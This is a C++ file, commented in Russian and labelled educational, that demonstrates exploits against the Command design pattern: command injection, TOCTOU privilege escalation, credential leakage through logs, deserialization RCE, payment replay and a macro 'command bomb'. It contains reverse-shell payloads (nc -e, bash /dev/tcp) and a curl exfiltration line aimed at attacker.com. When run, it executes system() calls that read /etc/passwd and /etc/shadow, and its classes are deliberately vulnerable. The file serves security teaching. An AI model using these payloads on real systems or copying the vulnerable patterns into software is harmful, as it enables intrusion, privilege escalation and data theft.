#include <iostream>
#include <string>
#include <vector>
#include <memory>
#include <cstdlib>
#include <sstream>
#include <thread>
#include <chrono>

/**
 * @file command_exploits.cpp
 * @brief Практические эксплойты для Command паттерна
 * 
 * ⚠️  ТОЛЬКО ДЛЯ ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЕЙ!
 */

// ============================================================================
// ЭКСПЛОЙТ 1: COMMAND INJECTION ДЛЯ REMOTE CODE EXECUTION
// Цель: Получить shell доступ через injection
// ============================================================================

class VulnerableCommand {
public:
    virtual ~VulnerableCommand() = default;
    virtual void execute() = 0;
};

class SystemCommand : public VulnerableCommand {
private:
    std::string command_;
    
public:
    explicit SystemCommand(const std::string& cmd) : command_(cmd) {}
    
    void execute() override {
        std::cout << "[System] Выполнение: " << command_ << "\n";
        system(command_.c_str());  // УЯЗВИМОСТЬ!
    }
};

void exploit_command_injection_rce() {
    std::cout << "\n=== ЭКСПЛОЙТ 1: Command Injection → RCE ===\n";
    
    std::cout << "Сценарий: Web-приложение позволяет пользователям\n";
    std::cout << "           выполнять команды через API\n\n";
    
    // Легитимное использование
    std::cout << "1. Легитимный запрос:\n";
    SystemCommand cmd1("ls -la /tmp");
    cmd1.execute();
    
    std::cout << "\n2. АТАКА: Command Injection через ;\n";
    SystemCommand cmd2("ls -la /tmp; whoami");
    cmd2.execute();
    
    std::cout << "\n3. АТАКА: Reverse shell (симуляция)\n";
    std::string payload = "ls; echo 'nc -e /bin/sh attacker.com 4444'";
    SystemCommand cmd3(payload);
    cmd3.execute();
    
    std::cout << "\n4. АТАКА: Чтение конфиденциальных файлов\n";
    SystemCommand cmd4("cat /etc/passwd || echo 'shadow file'");
    cmd4.execute();
    
    std::cout << "\n5. АТАКА: Data exfiltration\n";
    SystemCommand cmd5("ls -la ~ | curl -X POST -d @- https://attacker.com/collect");
    std::cout << "Выполнение: " << "ls -la ~ | curl ..." << " (симуляция)\n";
    
    std::cout << "\n💡 Последствия:\n";
    std::cout << "   ✓ Полный контроль над сервером\n";
    std::cout << "   ✓ Кража данных\n";
    std::cout << "   ✓ Lateral movement\n";
}

// ============================================================================
// ЭКСПЛОЙТ 2: PRIVILEGE ESCALATION ЧЕРЕЗ TOCTOU
// Цель: Выполнить админ команду с правами обычного пользователя
// ============================================================================

enum class Permission { USER, ADMIN };

struct User {
    std::string name;
    Permission permission;
    
    User(const std::string& n, Permission p) : name(n), permission(p) {}
};

class PrivilegedAction : public VulnerableCommand {
private:
    std::string action_;
    Permission required_;
    
public:
    PrivilegedAction(const std::string& action, Permission req)
        : action_(action), required_(req) {}
    
    Permission getRequired() const { return required_; }
    
    void execute() override {
        std::cout << "🔓 Выполнение привилегированной команды: " 
                  << action_ << "\n";
        
        if (action_ == "grant_admin") {
            std::cout << "  → ПРАВА АДМИНИСТРАТОРА ВЫДАНЫ!\n";
        } else if (action_ == "delete_all_users") {
            std::cout << "  → ВСЕ ПОЛЬЗОВАТЕЛИ УДАЛЕНЫ!\n";
        }
    }
};

class VulnerableExecutor {
private:
    User* current_user_;
    
public:
    VulnerableExecutor(User* user) : current_user_(user) {}
    
    void setUser(User* user) {
        current_user_ = user;
    }
    
    void executePrivileged(PrivilegedAction* cmd) {
        // УЯЗВИМОСТЬ: Time-of-Check to Time-of-Use
        if (current_user_->permission >= cmd->getRequired()) {
            std::cout << "[Check] Права OK для " << current_user_->name << "\n";
            
            // Задержка (симуляция обработки)
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            
            // [Use] current_user_ мог измениться!
            cmd->execute();
        } else {
            std::cout << "[Denied] Недостаточно прав для " 
                      << current_user_->name << "\n";
        }
    }
};

void exploit_privilege_escalation_toctou() {
    std::cout << "\n=== ЭКСПЛОЙТ 2: Privilege Escalation (TOCTOU) ===\n";
    
    User regular_user("attacker", Permission::USER);
    User admin("admin", Permission::ADMIN);
    
    VulnerableExecutor executor(&regular_user);
    PrivilegedAction admin_cmd("grant_admin", Permission::ADMIN);
    
    std::cout << "Сценарий: Атакующий эксплуатирует race condition\n\n";
    
    // Поток атакующего
    std::thread attacker_thread([&executor, &admin_cmd, &regular_user]() {
        std::cout << "[Attacker Thread] Запрос админ команды как USER...\n";
        executor.executePrivileged(&admin_cmd);
    });
    
    // Поток который меняет контекст (эксплойт)
    std::thread exploit_thread([&executor, &admin]() {
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
        std::cout << "[Exploit Thread] 🚨 Подмена пользователя на ADMIN!\n";
        executor.setUser(&admin);
    });
    
    attacker_thread.join();
    exploit_thread.join();
    
    std::cout << "\n💡 Результат:\n";
    std::cout << "   ✓ Обход проверки прав через TOCTOU\n";
    std::cout << "   ✓ Выполнение привилегированной команды\n";
    std::cout << "   ✓ Получение прав администратора\n";
}

// ============================================================================
// ЭКСПЛОЙТ 3: CREDENTIALS THEFT ИЗ COMMAND HISTORY
// Цель: Извлечь пароли и токены из истории команд
// ============================================================================

class CredentialCommand : public VulnerableCommand {
private:
    std::string username_;
    std::string password_;
    
public:
    CredentialCommand(const std::string& user, const std::string& pass)
        : username_(user), password_(pass) {}
    
    void execute() override {
        std::cout << "Аутентификация пользователя: " << username_ << "\n";
    }
    
    std::string getLogEntry() const {
        // УЯЗВИМОСТЬ: Пароль в plain text!
        return "Login: " + username_ + " with password: " + password_;
    }
};

class VulnerableHistory {
private:
    std::vector<std::shared_ptr<VulnerableCommand>> history_;
    
public:
    void add(std::shared_ptr<VulnerableCommand> cmd) {
        history_.push_back(cmd);
    }
    
    void dumpToFile(const std::string& filename) {
        std::cout << "Сохранение истории в " << filename << "...\n";
        // В реальности записывает в файл
        
        for (auto& cmd : history_) {
            auto cred_cmd = std::dynamic_pointer_cast<CredentialCommand>(cmd);
            if (cred_cmd) {
                std::cout << "  → " << cred_cmd->getLogEntry() << "\n";
            }
        }
    }
};

void exploit_credentials_theft() {
    std::cout << "\n=== ЭКСПЛОЙТ 3: Credentials Theft из History ===\n";
    
    std::cout << "Сценарий: Атакующий получил доступ к серверу\n";
    std::cout << "           и ищет credentials в логах\n\n";
    
    VulnerableHistory history;
    
    // Пользователи выполняют команды с паролями
    auto cmd1 = std::make_shared<CredentialCommand>("alice", "alice_password_123");
    cmd1->execute();
    history.add(cmd1);
    
    auto cmd2 = std::make_shared<CredentialCommand>("bob", "SuperSecret456!");
    cmd2->execute();
    history.add(cmd2);
    
    auto cmd3 = std::make_shared<CredentialCommand>("admin", "AdminP@ssw0rd");
    cmd3->execute();
    history.add(cmd3);
    
    std::cout << "\n🚨 Атакующий получает доступ к логам:\n";
    history.dumpToFile("/var/log/command_history.log");
    
    std::cout << "\n💡 Последствия:\n";
    std::cout << "   ✓ Все пароли скомпрометированы\n";
    std::cout << "   ✓ Lateral movement возможен\n";
    std::cout << "   ✓ Дальнейшая эскалация привилегий\n";
}

// ============================================================================
// ЭКСПЛОЙТ 4: DESERIALIZATION RCE
// Цель: Выполнить произвольный код через десериализацию
// ============================================================================

class SerializedCommand : public VulnerableCommand {
private:
    std::string type_;
    std::string payload_;
    
public:
    SerializedCommand(const std::string& type, const std::string& payload)
        : type_(type), payload_(payload) {}
    
    static std::shared_ptr<SerializedCommand> deserialize(const std::string& data) {
        size_t pos = data.find('|');
        std::string type = data.substr(0, pos);
        std::string payload = data.substr(pos + 1);
        
        // УЯЗВИМОСТЬ: Нет валидации типа!
        return std::make_shared<SerializedCommand>(type, payload);
    }
    
    void execute() override {
        std::cout << "[" << type_ << "] Выполнение: " << payload_ << "\n";
        
        if (type_ == "system") {
            // ОПАСНО: Произвольное выполнение
            system(payload_.c_str());
        } else if (type_ == "eval") {
            std::cout << "  → Выполнение кода: " << payload_ << "\n";
        }
    }
};

void exploit_deserialization_rce() {
    std::cout << "\n=== ЭКСПЛОЙТ 4: Deserialization RCE ===\n";
    
    std::cout << "Сценарий: API принимает сериализованные команды\n";
    std::cout << "          от клиентов через network\n\n";
    
    // Легитимная команда
    std::string legit = "print|Hello World";
    std::cout << "1. Легитимная команда: " << legit << "\n";
    auto cmd1 = SerializedCommand::deserialize(legit);
    cmd1->execute();
    
    // АТАКА: Вредоносная десериализация
    std::cout << "\n2. АТАКА: Вредоносный payload\n";
    std::string malicious = "system|cat /etc/shadow || echo 'shadow dump'";
    std::cout << "   Payload: " << malicious << "\n";
    
    auto evil_cmd = SerializedCommand::deserialize(malicious);
    evil_cmd->execute();
    
    // АТАКА: Reverse shell
    std::cout << "\n3. АТАКА: Reverse shell payload\n";
    std::string reverse_shell = "system|bash -i >& /dev/tcp/attacker.com/4444 0>&1";
    std::cout << "   Payload: " << reverse_shell << " (симуляция)\n";
    
    std::cout << "\n💡 Последствия:\n";
    std::cout << "   ✓ Remote Code Execution\n";
    std::cout << "   ✓ Полный контроль над системой\n";
    std::cout << "   ✓ Persistence через backdoors\n";
}

// ============================================================================
// ЭКСПЛОЙТ 5: REPLAY ATTACK ДЛЯ FINANCIAL FRAUD
// Цель: Повторить транзакцию для кражи средств
// ============================================================================

class PaymentCommand : public VulnerableCommand {
private:
    std::string from_;
    std::string to_;
    double amount_;
    
public:
    PaymentCommand(const std::string& from, const std::string& to, double amount)
        : from_(from), to_(to), amount_(amount) {}
    
    void execute() override {
        std::cout << "💸 Перевод $" << amount_ 
                  << " от " << from_ << " → " << to_ << "\n";
    }
    
    // УЯЗВИМОСТЬ: Нет защиты от копирования!
    PaymentCommand copy() const {
        return PaymentCommand(from_, to_, amount_);
    }
};

void exploit_replay_attack_fraud() {
    std::cout << "\n=== ЭКСПЛОЙТ 5: Replay Attack для финансового мошенничества ===\n";
    
    std::cout << "Сценарий: Атакующий перехватывает платежную команду\n";
    std::cout << "          и повторяет её многократно\n\n";
    
    // Легитимная транзакция
    PaymentCommand legit_payment("Alice", "Bob", 1000.0);
    
    std::cout << "1. Легитимная транзакция:\n";
    legit_payment.execute();
    
    // АТАКА: Перехват и replay
    std::cout << "\n2. 🚨 АТАКА: Перехват команды и replay\n";
    std::cout << "   Атакующий (MitM) перехватил команду и повторяет:\n\n";
    
    double total_stolen = 0;
    for (int i = 0; i < 5; ++i) {
        auto replayed = legit_payment.copy();
        std::cout << "   Replay #" << (i+1) << ": ";
        replayed.execute();
        total_stolen += 1000.0;
    }
    
    std::cout << "\n💡 Результат атаки:\n";
    std::cout << "   ✓ Украдено: $" << total_stolen << " вместо $1000\n";
    std::cout << "   ✓ Нет nonce/timestamp защиты\n";
    std::cout << "   ✓ Нет rate limiting\n";
}

// ============================================================================
// ЭКСПЛОЙТ 6: DOS ЧЕРЕЗ MACRO COMMAND BOMB
// Цель: Вызвать отказ в обслуживании через экспоненциальное увеличение
// ============================================================================

class MacroCommand : public VulnerableCommand {
private:
    std::vector<std::shared_ptr<VulnerableCommand>> commands_;
    std::string name_;
    
public:
    explicit MacroCommand(const std::string& name) : name_(name) {}
    
    void add(std::shared_ptr<VulnerableCommand> cmd) {
        commands_.push_back(cmd);
    }
    
    void execute() override {
        std::cout << "[Macro: " << name_ << "] Выполнение " 
                  << commands_.size() << " команд\n";
        
        for (auto& cmd : commands_) {
            cmd->execute();
        }
    }
    
    size_t count() const {
        size_t total = commands_.size();
        for (auto& cmd : commands_) {
            auto macro = std::dynamic_pointer_cast<MacroCommand>(cmd);
            if (macro) {
                total += macro->count();
            }
        }
        return total;
    }
};

void exploit_dos_command_bomb() {
    std::cout << "\n=== ЭКСПЛОЙТ 6: DoS через Command Bomb ===\n";
    
    std::cout << "Сценарий: Атакующий создает экспоненциально растущую\n";
    std::cout << "          цепочку макро-команд\n\n";
    
    // Создаем "бомбу" из вложенных макросов
    auto base = std::make_shared<MacroCommand>("Base");
    for (int i = 0; i < 10; ++i) {
        base->add(std::make_shared<SystemCommand>("echo x"));
    }
    
    auto level2 = std::make_shared<MacroCommand>("Level2");
    for (int i = 0; i < 10; ++i) {
        level2->add(base);  // 10 * 10 = 100
    }
    
    auto level3 = std::make_shared<MacroCommand>("Level3");
    for (int i = 0; i < 10; ++i) {
        level3->add(level2);  // 10 * 100 = 1000
    }
    
    auto bomb = std::make_shared<MacroCommand>("BOMB");
    for (int i = 0; i < 10; ++i) {
        bomb->add(level3);  // 10 * 1000 = 10,000
    }
    
    std::cout << "Создана command bomb:\n";
    std::cout << "  Уровней вложенности: 4\n";
    std::cout << "  Общее количество команд: " << bomb->count() << "\n";
    std::cout << "  Попытка выполнения...\n\n";
    
    std::cout << "⚠️  НЕ ВЫПОЛНЯЕМ (10,000+ команд вызовут зависание)\n";
    
    std::cout << "\n💡 Последствия:\n";
    std::cout << "   ✓ Исчерпание CPU (100% utilization)\n";
    std::cout << "   ✓ Исчерпание памяти (stack overflow)\n";
    std::cout << "   ✓ Denial of Service\n";
    std::cout << "   ✓ Возможный crash сервера\n";
}

// ============================================================================
// MAIN
// ============================================================================

int main() {
    std::cout << "=== ПРАКТИЧЕСКИЕ ЭКСПЛОЙТЫ COMMAND PATTERN ===\n";
    std::cout << "⚠️  ВНИМАНИЕ: Только для обучения!\n";
    
    try {
        exploit_command_injection_rce();
    } catch (const std::exception& e) {
        std::cout << "Exception: " << e.what() << "\n";
    }
    
    try {
        exploit_privilege_escalation_toctou();
    } catch (const std::exception& e) {
        std::cout << "Exception: " << e.what() << "\n";
    }
    
    try {
        exploit_credentials_theft();
    } catch (const std::exception& e) {
        std::cout << "Exception: " << e.what() << "\n";
    }
    
    try {
        exploit_deserialization_rce();
    } catch (const std::exception& e) {
        std::cout << "Exception: " << e.what() << "\n";
    }
    
    try {
        exploit_replay_attack_fraud();
    } catch (const std::exception& e) {
        std::cout << "Exception: " << e.what() << "\n";
    }
    
    try {
        exploit_dos_command_bomb();
    } catch (const std::exception& e) {
        std::cout << "Exception: " << e.what() << "\n";
    }
    
    std::cout << "\n=== ЗАЩИТНЫЕ МЕРЫ ===\n";
    std::cout << "✅ Input validation и whitelist команд\n";
    std::cout << "✅ Принцип наименьших привилегий\n";
    std::cout << "✅ Не храните sensitive data в истории\n";
    std::cout << "✅ Валидация при десериализации\n";
    std::cout << "✅ Nonce/timestamp для replay protection\n";
    std::cout << "✅ Ограничение глубины вложенности\n";
    std::cout << "✅ Rate limiting для критических команд\n";
    
    return 0;
}
